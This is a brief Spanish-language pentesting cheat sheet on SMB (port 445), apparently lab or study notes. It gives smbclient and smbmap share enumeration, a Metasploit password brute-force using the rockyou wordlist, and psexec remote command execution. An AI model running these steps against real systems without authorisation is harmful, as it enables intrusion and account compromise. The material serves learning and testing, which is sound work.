# Protocolo SMB (Puerto 445)

SMB permite compartir archivos e impresoras en redes Windows. Es uno de los protocolos mas explotados.

## Enumeracion con smbclient

Listar recursos compartidos sin credenciales (acceso anonimo):

```bash
smbclient -L <IP_objetivo> -N
```

Con credenciales conocidas:

```bash
smbclient -L //<IP_objetivo> -U 'usuario'
```

Conectarse a un recurso compartido:

```bash
smbclient -U 'usuario' //<IP_objetivo>/recurso
```

## Enumeracion con smbmap

smbmap muestra permisos de los recursos compartidos (lectura/escritura).

```bash
smbmap -H <IP_objetivo> -u 'usuario' -p 'contraseña'
```

```bash
smbmap -H <IP_objetivo> -u 'usuario' -p 'contraseña' -r recurso
```

> `-r` lista recursivamente el contenido del recurso compartido.

## Fuerza Bruta SMB con Metasploit

```bash
msfconsole

use auxiliary/scanner/smb/smb_login
show options
set RHOSTS <IP_objetivo>
set VERBOSE false
set SMBUser <usuario>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

## Explotacion con PsExec (Metasploit)

Si tenemos credenciales de administrador, podemos ejecutar comandos remotamente.

```bash
use exploit/windows/smb/psexec
show options
set RHOSTS <IP_objetivo>
set SMBUser <usuario>
set SMBPass <contraseña>
run
```
